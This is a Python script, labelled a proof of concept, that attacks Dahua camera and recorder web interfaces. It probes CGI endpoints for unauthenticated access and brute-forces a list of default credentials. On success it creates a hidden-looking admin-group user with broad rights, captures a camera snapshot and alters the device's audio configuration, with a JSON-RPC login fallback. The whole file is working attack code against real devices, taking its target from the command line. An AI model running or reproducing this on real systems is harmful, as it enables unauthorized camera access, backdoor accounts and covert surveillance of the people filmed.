#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PoC script for Dahua HTTP / CGI & RPC endpoints on localhost (or forwarded tunnel).
Tests:
  1. Unauthenticated endpoints & CVE checks
  2. HTTP Digest Authentication (RFC 2617 / RFC 2069) & Basic Auth
  3. General info & system config retrieval (General.SystemInfo, General)
  4. User creation (userManager.cgi?action=addUser)
  5. Snapshot capture (snapshot.cgi)
  6. Audio config adjustments
  7. RPC2 / JSON-RPC fallback
"""

import sys
import os
import re
import socket
import struct
import json
import hashlib
import time
import urllib.request
import urllib.parse
import urllib.error

# Default target parameters
HOST = "127.0.0.1"
PORT = 80  # Change to 80, 1337, 8080, etc. as needed

# Credentials to test
DEFAULT_USERS = [
    ("admin", "admin"),
    ("admin", ""),
    ("admin", "888888"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("admin", "TancuiPantera1337"),
]

# New user to add
NEW_USER = "krushitel"
NEW_PASS = "TancuiPantera1337"
NEW_GROUP = "admin"
NEW_AUTHLIST = "Config|Info|Monitor_01|Playback_01|AuthUserMag|AuthSysCfg|AuthSysInfo|AuthStoreCfg"

# CGI Endpoints
ENDPOINTS = {
    "system_info": "/cgi-bin/configManager.cgi?action=getConfig&name=General.SystemInfo",
    "general": "/cgi-bin/configManager.cgi?action=getConfig&name=General",
    "magicbox_info": "/cgi-bin/magicBox.cgi?action=getSystemInfo",
    "device_type": "/cgi-bin/magicBox.cgi?action=getDeviceType",
    "users_all": "/cgi-bin/userManager.cgi?action=getUserInfoAll",
    "snapshot": "/cgi-bin/snapshot.cgi?channel=1",
    "audio_off_a": "/cgi-bin/configManager.cgi?action=setConfig&AudioInDenoise[0].enable=false",
    "audio_off_b": "/cgi-bin/configManager.cgi?action=setConfig&AudioInDenoise[0].Enable=false",
}


class DigestAuthHandler:
    """Manual RFC 2617 Digest Auth client over raw sockets."""
    def __init__(self, host, port, username, password):
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.nc = 0
        self.last_nonce = ""
        self.realm = ""
        self.qop = ""
        self.opaque = ""
        self.algorithm = "MD5"

    def _parse_www_authenticate(self, header_val):
        params = {}
        for match in re.finditer(r'(\w+)=(?:"([^"]+)"|([^\s,]+))', header_val):
            k = match.group(1).lower()
            v = match.group(2) if match.group(2) is not None else match.group(3)
            params[k] = v
        self.realm = params.get("realm", "Login to Dahua")
        self.last_nonce = params.get("nonce", "")
        self.qop = params.get("qop", "")
        self.opaque = params.get("opaque", "")
        self.algorithm = params.get("algorithm", "MD5").upper()
        return params

    def build_auth_header(self, method, uri):
        if not self.realm or not self.last_nonce:
            return None
        self.nc += 1
        nc_str = f"{self.nc:08x}"
        cnonce = hashlib.md5(f"{time.time()}:{self.nc}".encode()).hexdigest()[:16]

        # HA1 = MD5(username:realm:password)
        ha1_raw = f"{self.username}:{self.realm}:{self.password}"
        ha1 = hashlib.md5(ha1_raw.encode("utf-8")).hexdigest()

        # HA2 = MD5(method:uri)
        ha2_raw = f"{method}:{uri}"
        ha2 = hashlib.md5(ha2_raw.encode("utf-8")).hexdigest()

        # Response hash
        if "auth" in self.qop.split(","):
            resp_raw = f"{ha1}:{self.last_nonce}:{nc_str}:{cnonce}:auth:{ha2}"
            response = hashlib.md5(resp_raw.encode("utf-8")).hexdigest()
            header = (
                f'Digest username="{self.username}", realm="{self.realm}", '
                f'nonce="{self.last_nonce}", uri="{uri}", response="{response}", '
                f'qop=auth, nc={nc_str}, cnonce="{cnonce}"'
            )
        else:
            # RFC 2069 without qop
            resp_raw = f"{ha1}:{self.last_nonce}:{ha2}"
            response = hashlib.md5(resp_raw.encode("utf-8")).hexdigest()
            header = (
                f'Digest username="{self.username}", realm="{self.realm}", '
                f'nonce="{self.last_nonce}", uri="{uri}", response="{response}"'
            )

        if self.opaque:
            header += f', opaque="{self.opaque}"'
        if self.algorithm:
            header += f', algorithm="{self.algorithm}"'
        return header

    def request(self, method, path, body=None, extra_headers=None, timeout=5):
        """Sends HTTP request and handles 401 Digest challenge automatically."""
        headers = {
            "Host": f"{self.host}:{self.port}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Connection": "close",
        }
        if extra_headers:
            headers.update(extra_headers)

        # 1. Initial attempt with cached auth if available
        auth_hdr = self.build_auth_header(method, path)
        if auth_hdr:
            headers["Authorization"] = auth_hdr

        code, resp_headers, resp_body = self._raw_http(method, path, headers, body, timeout)

        # 2. If 401 challenge returned, parse WWW-Authenticate and retry
        if code == 401 and "www-authenticate" in resp_headers:
            auth_val = resp_headers["www-authenticate"]
            if "digest" in auth_val.lower():
                self._parse_www_authenticate(auth_val)
                headers["Authorization"] = self.build_auth_header(method, path)
                code, resp_headers, resp_body = self._raw_http(method, path, headers, body, timeout)

        return code, resp_headers, resp_body

    def _raw_http(self, method, path, headers, body, timeout):
        req_lines = [f"{method} {path} HTTP/1.1"]
        for k, v in headers.items():
            req_lines.append(f"{k}: {v}")
        if body:
            req_lines.append(f"Content-Length: {len(body)}")
        req_lines.append("")
        req_lines.append("")
        raw_req = "\r\n".join(req_lines).encode("utf-8")
        if body:
            if isinstance(body, str):
                body = body.encode("utf-8")
            raw_req += body

        s = socket.create_connection((self.host, self.port), timeout=timeout)
        try:
            s.sendall(raw_req)
            resp_data = bytearray()
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                resp_data += chunk
        finally:
            s.close()

        # Parse HTTP response
        header_end = resp_data.find(b"\r\n\r\n")
        if header_end == -1:
            return 0, {}, bytes(resp_data)

        header_bytes = resp_data[:header_end]
        body_bytes = resp_data[header_end + 4:]

        lines = header_bytes.decode("iso-8859-1", "replace").split("\r\n")
        status_line = lines[0] if lines else ""
        status_code = 0
        parts = status_line.split(" ", 2)
        if len(parts) >= 2 and parts[1].isdigit():
            status_code = int(parts[1])

        parsed_headers = {}
        for line in lines[1:]:
            if ":" in line:
                hk, hv = line.split(":", 1)
                parsed_headers[hk.strip().lower()] = hv.strip()

        return status_code, parsed_headers, bytes(body_bytes)


def probe_unauth(host, port):
    """Check if any endpoints answer without authentication."""
    print(f"\n[*] Probing unauthenticated endpoints on {host}:{port}...")
    handler = DigestAuthHandler(host, port, "", "")
    for name, ep in ENDPOINTS.items():
        try:
            code, hdrs, body = handler.request("GET", ep, timeout=4)
            sample = body[:120].decode("utf-8", "ignore").strip().replace("\r", " ").replace("\n", " ")
            print(f"  [{code}] {ep[:45]}... -> {sample}")
            if code == 200 and ("table.General" in sample or "LocaleName" in sample or "version" in sample.lower()):
                print(f"  [+] UNAUTH ACCESS CONFIRMED on {ep}!")
        except Exception as e:
            print(f"  [-] {ep[:45]} failed: {e}")


def test_login_and_info(host, port, user, password):
    """Test login against General.SystemInfo with Digest Auth."""
    print(f"\n[*] Testing credentials [{user}:{password}] on {host}:{port}...")
    handler = DigestAuthHandler(host, port, user, password)
    try:
        code, hdrs, body = handler.request("GET", ENDPOINTS["general"], timeout=4)
        body_str = body.decode("utf-8", "ignore")
        if code == 200 and ("table.General" in body_str or "LocaleName" in body_str or "DeviceName" in body_str):
            print(f"  [+] SUCCESS! Valid login [{user}:{password}]")
            print(f"  [+] Response preview:\n{body_str[:300]}")
            return handler, True
        else:
            print(f"  [-] Login rejected / response code {code}")
            return handler, False
    except Exception as e:
        print(f"  [-] Connection error with [{user}:{password}]: {e}")
        return handler, False


def add_user_via_cgi(handler, new_user, new_pass, group="admin", auth_list=NEW_AUTHLIST):
    """Add a new user via userManager.cgi?action=addUser."""
    print(f"\n[*] Attempting to add user [{new_user}:{new_pass}] (group={group})...")
    
    # URL encode parameters
    params = {
        "action": "addUser",
        "user.Name": new_user,
        "user.Password": new_pass,
        "user.Group": group,
        "user.Sharable": "true",
        "user.Reserved": "false",
        "user.AuthList": auth_list,
    }
    query_str = urllib.parse.urlencode(params)
    add_ep = f"/cgi-bin/userManager.cgi?{query_str}"

    code, hdrs, body = handler.request("GET", add_ep, timeout=8)
    body_str = body.decode("utf-8", "ignore").strip()
    print(f"  [*] AddUser response ({code}): {body_str}")

    if "OK" in body_str or code == 200:
        print(f"  [+] User [{new_user}] successfully created or server returned OK!")
        return True
    elif "already exist" in body_str.lower() or "UserExist" in body_str:
        print(f"  [!] User [{new_user}] already exists. Trying to delete and recreate...")
        del_ep = f"/cgi-bin/userManager.cgi?action=deleteUser&name={urllib.parse.quote(new_user)}"
        d_code, _, d_body = handler.request("GET", del_ep, timeout=8)
        print(f"  [*] DeleteUser response: {d_body.decode('utf-8', 'ignore').strip()}")
        # Retry add
        code2, _, body2 = handler.request("GET", add_ep, timeout=8)
        body2_str = body2.decode("utf-8", "ignore").strip()
        print(f"  [*] Retry AddUser response ({code2}): {body2_str}")
        return "OK" in body2_str or code2 == 200
    else:
        print(f"  [-] AddUser failed: {body_str}")
        return False


def test_snapshot(handler, out_file="snapshot_test.jpg"):
    """Fetch JPEG snapshot from snapshot.cgi."""
    print(f"\n[*] Fetching snapshot from {ENDPOINTS['snapshot']}...")
    code, hdrs, body = handler.request("GET", ENDPOINTS["snapshot"], timeout=8)
    if code == 200 and len(body) > 1000 and body.startswith(b"\xff\xd8"):
        print(f"  [+] Valid JPEG snapshot received ({len(body)} bytes)!")
        with open(out_file, "wb") as f:
            f.write(body)
        print(f"  [+] Saved snapshot to {out_file}")
        return True
    else:
        print(f"  [-] Snapshot failed ({code}): len={len(body)}")
        return False


def test_rpc2_login(host, port, user, password):
    """Test JSON-RPC login via /RPC2_Login or /RPC2."""
    print(f"\n[*] Testing /RPC2_Login for [{user}:{password}] on {host}:{port}...")
    payload = json.dumps({
        "method": "global.login",
        "params": {
            "userName": user,
            "password": password,
            "clientType": "Web3.0",
            "loginType": "Direct",
            "ipAddr": "127.0.0.1"
        },
        "id": 1,
        "session": 0
    })
    handler = DigestAuthHandler(host, port, "", "")
    try:
        code, hdrs, body = handler.request(
            "POST",
            "/RPC2_Login",
            body=payload,
            extra_headers={"Content-Type": "application/json"}
        )
        body_str = body.decode("utf-8", "ignore")
        print(f"  [*] /RPC2_Login status: {code}, response: {body_str}")
        if code == 200 and '"result":true' in body_str.replace(" ", ""):
            print("  [+] RPC2 login successful!")
            return True
    except Exception as e:
        print(f"  [-] RPC2 login exception: {e}")
    return False


def main():
    target_host = sys.argv[1] if len(sys.argv) > 1 else HOST
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT

    print("=" * 60)
    print(f"Dahua HTTP / CGI PoC Tester -> {target_host}:{target_port}")
    print("=" * 60)

    # 1. Unauthenticated test
    probe_unauth(target_host, target_port)

    # 2. Test credentials list
    active_handler = None
    for u, p in DEFAULT_USERS:
        handler, ok = test_login_and_info(target_host, target_port, u, p)
        if ok:
            active_handler = handler
            break

    # 3. If credentials found, perform operations
    if active_handler:
        # A. Add user
        add_ok = add_user_via_cgi(active_handler, NEW_USER, NEW_PASS)
        if add_ok:
            # Verify new user login
            test_login_and_info(target_host, target_port, NEW_USER, NEW_PASS)

        # B. Get snapshot
        test_snapshot(active_handler)

        # C. Turn off audio denoise
        print(f"\n[*] Applying audio settings...")
        c1, _, b1 = active_handler.request("GET", ENDPOINTS["audio_off_a"])
        print(f"  [*] Audio off A: {c1} -> {b1.decode('utf-8', 'ignore').strip()}")
        c2, _, b2 = active_handler.request("GET", ENDPOINTS["audio_off_b"])
        print(f"  [*] Audio off B: {c2} -> {b2.decode('utf-8', 'ignore').strip()}")
    else:
        print("\n[-] No default credentials worked. Testing /RPC2 fallback...")
        for u, p in DEFAULT_USERS:
            if test_rpc2_login(target_host, target_port, u, p):
                break

    print("\n" + "=" * 60)
    print("[*] PoC test finished.")
    print("=" * 60)


if __name__ == "__main__":
    main()
